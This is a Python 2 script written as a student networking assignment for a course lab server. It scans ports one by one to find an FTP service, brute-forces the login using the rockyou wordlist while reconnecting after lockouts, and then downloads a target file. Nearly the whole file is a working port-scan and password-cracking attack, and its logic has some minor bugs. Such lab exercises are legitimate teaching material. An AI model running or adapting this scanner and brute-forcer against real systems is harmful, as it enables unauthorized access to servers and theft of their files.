#Ryan Slyter
#CS455
#Programming Assignment 1
from socket import *
import sys
import re

#Here we have two python.re supported regexes, one for find the 
#address and ports from the PASV server responses, and a second
#for finding the filename from a unix directory listing of the file.
port_re = re.compile("[-\d]+,[-\d]+,[-\d]+,[-\d]+,([-\d]+),([-\d]+)")
file_re = re.compile("[0-9|A-Z|a-z|_]+.txt")

#single word client commands that need no further construction
quit_msg = b'QUIT\r\n'
pasv_msg = b'PASV\r\n'
list_msg = b'LIST\r\n'
retr_msg = b'RETR'

maxPort = 65536 #maximum port number on Dr. Dang's server
serverPort = 1
serverName = 'netlab.encs.vancouver.wsu.edu' #we are given this in the assignment
login = b'USER cs455\r\n' #we are given this in the assignment

#This is a helper function to initiate the passive response
#from the server and and 'tease' out the two integers we need
#using a compiled regex module to calculate the data port,
#returning the port
def get_port(cntrl_sock):
    cntrl_sock.sendall(pasv_msg);
    connection_resp = clientSocket.recv(1024)
    if not '227' in connection_resp:
        print 'PASV operation failed'
        sys.exit('Critical error. Program exit.')    
    pasv_resp = port_re.search(connection_resp)
    if not pasv_resp:
        sys.exit('Critical: PASV server response error. Program exit')
    portA, portB = pasv_resp.groups()
    new_port = int(portA)*256 + int(portB)
    return new_port

#This helper function supports sending the appropriate LIST or RETR
#command and walks through the proper servers responses while gathering
#the data from the socket.
def get_content (sock, cmd):
    try:
        clientSocket.sendall(cmd)
        response = clientSocket.recv(1080)
        if not '150' in response:
            print 'Communication Error with list command'    
        new_data = data_connection.recv(4096)
        response = clientSocket.recv(1080)
        if not '226' in response:
            print 'Communication Error at end of directory xfer'       
    except BaseException as e:
        print str(e)
    return new_data

#Helper function that is designed to connect to a newly
#given port for retrieving data from the server.
def get_connect (port):
    try:
        dataSocket = socket(AF_INET, SOCK_STREAM)
        dataSocket.settimeout(5)
        dataSocket.connect((serverName, port))                                           
    except BaseException as e:
        print 'Error Establing and geting data connection: ' + str(e)        
        return
    return dataSocket
    
#PART I
#Keeping trying to connect in the port interval until the correct
#port number is found by looking at the host welcome message
#and seeing if there's 'FTP' in it
while serverPort < maxPort:
    try:        
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.settimeout(5)
        clientSocket.connect((serverName, serverPort))
        welcome = clientSocket.recv(1024)
        if 'FTP' in welcome:
            break
        serverPort += 1 #port connected to, but it wasn't FTP, iterate
        clientSocket.close()
        continue
    except BaseException:
        clientSocket.close() #port wasn't connected to, iterate
        serverPort += 1
        continue

if serverPort == maxPort:
    sys.exit('No FTP server found. Program exit.')

print 'FTP connection found on port: ' + str(serverPort)
##########################END PART I ################################

#PART II
#Open local file with a list of passwords and 'brute force' your way
#in, knowing that every 3 failed attempts will get you kicked off
#with an exception from the host

try:
    passlist = open("rockyou_light.txt", "r") #The pasword file is given to us alrdy
except IOError:    
    clientSocket.close()
    sys.exit('Critical: password file could not be opened. Program exit')

#Biggest part of the script, keep iterating through passwords (lines)
#in the file and trying them, looking for exception and then recreating
#the connection when it fails
while 1:
    password = passlist.readline()
    
    if password == '':  #check for the end of the file
        clientSocket.close()
        passlist.close()
        sys.exit('no more passwords to try. Program exit')
    try:
        clientSocket.sendall(login)
        response = clientSocket.recv(1024)
        if not '331' in response: #if the login isn't correct (it will be) the program can't continue
            sys.exit('Critical: login incorrect. No point in continuing since we have no other names.\nProgram exit.')
        crackattempt = b'PASS ' + password + b'\r\n' #creating the password command
        
        clientSocket.sendall(crackattempt)
        response = clientSocket.recv(1024)
        if '530' in response:
            continue
        else:
            assert '230' in response
            break
    except BaseException:
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.settimeout(5)
        clientSocket.connect((serverName, serverPort))
        continue

print 'Cracked into the FTP server...'
passlist.close()
#############################END PART II#################################

#PART III
#Get the directory listing from the server. From that data find a file
#with the words "cs455" and "programming" in the title and retrieve
#that file from the server.

#These 3 calls initiate the PASV command and retrieve data from the server
data_port = get_port(clientSocket)

data_connection = get_connect(data_port)

data = get_content(clientSocket, list_msg)

#I build another python regex module to run through the filenames
#NOTE: it only works for characters, numbers, and '_' and ending in .txt
examine = file_re.findall(data)
for element in examine:
    if 'cs455' and 'programming' in element:
        target = element
        break
print 'Target file is: ' + target 

#Create the file we need to store the contents
try:
    final_fi = open(target, "w+")
except IOError:    
    clientSocket.close()
    passlist.close()
    sys.exit('Critical: password file could not be opened. Program exit')

#Same 3 calls to get the data
data_port = get_port(clientSocket)

data_connection = get_connect(data_port)

#Create the RETR message we need with the file name
file_msg = retr_msg + b' ' + target + b'\r\n'

data = get_content(clientSocket, file_msg)

final_fi.write(data)

final_fi.close()

print 'Successfuly retrieved ' + target
#Send the final quit command
clientSocket.sendall(quit_msg)
last_msg = clientSocket.recv(1080)
print last_msg
clientSocket.close()
